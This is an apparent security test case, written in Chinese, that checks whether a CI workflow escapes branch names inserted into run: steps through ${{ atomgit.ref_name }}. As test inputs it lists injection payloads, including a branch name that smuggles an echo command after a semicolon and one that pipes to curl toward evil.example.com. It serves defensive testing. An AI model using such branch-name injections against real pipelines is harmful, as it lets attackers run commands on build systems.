用例 ID:   SEC-INJECT-01-003
维度标签:   [security]
维度:      安全性
优先级:    P0
溯源意图:  INTENT-SEC-011
母意图:    —
标题:      分支名中的不可信输入不应通过 ${{ }} 直接插入 run: 导致命令注入

前置条件:
  - 仓库配置了 push 触发器（或 pull_request）
  - 存在一个分支名称包含 shell 特殊字符的场景
  - workflow 直接使用 `${{ atomgit.ref_name }}` 或 `${{ atomgit.head_ref }}` 插入 run

操作步骤:
  1. 创建分支名为 `feature/zzz";echo INJECTED_BY_BRANCH;#`（含注入 payload）
  2. 推送该分支或创建来自该分支的 PR
  3. workflow 中的 `run: echo "${{ atomgit.ref_name }}"` 被执行
  4. 观察日志中是否出现 `INJECTED_BY_BRANCH`
  5. 同样测试含管道符 `|` 的分支名：`feature/a|curl evil.example.com`

预期结果:
  - 分支名中的 shell 元字符（`;`、`|`、`$()`、反引号）不应被解释执行
  - 日志中不应出现注入命令的执行痕迹
  - 分支名作为字符串输出时，特殊字符应被正确转义或保持原样但不触发执行

验证点:
  - [负向] 日志中不应出现 `INJECTED_BY_BRANCH`（分号后的命令不应被执行）
  - [负向] 分支名中的管道符不应导致管道后的命令被执行
  - [负向] 分支名中的命令替换语法（`$()`、反引号）不应被执行
  - [正向] 分支名作为字面字符串在日志中正常出现（含特殊字符原样）

清理:      fixture
